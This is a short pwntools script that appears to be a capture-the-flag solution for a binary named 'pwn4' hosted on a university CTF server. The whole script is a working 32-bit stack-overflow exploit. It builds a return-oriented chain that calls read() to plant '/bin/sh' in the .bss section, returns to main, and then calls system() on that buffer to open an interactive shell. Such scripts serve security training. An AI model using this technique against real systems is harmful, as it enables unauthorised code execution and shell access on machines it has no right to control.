from pwn import *
context.log_level='debug'
context.terminal=['gnome-terminal','-x','sh','-c']

p=process('pwn4')
p=remote('ctf.nefu.edu.cn',32813)
elf=ELF('./pwn4')
if args.G:
	gdb.attach(p)
	pause()
	
read_plt=elf.plt['read']
system=elf.plt['system']
bss=0x0804A041
main=elf.sym['main']
payload=b'a'*0x20+p32(read_plt)+p32(main)+p32(0)+p32(bss)+p32(0x8)
p.recvuntil('want')
p.sendline(payload)
pause()
p.sendline(b'/bin/sh')
payload=b'a'*0x20+p32(system)+b'aaaa'+p32(bss)
p.recvuntil('want')
p.sendline(payload)
p.interactive()
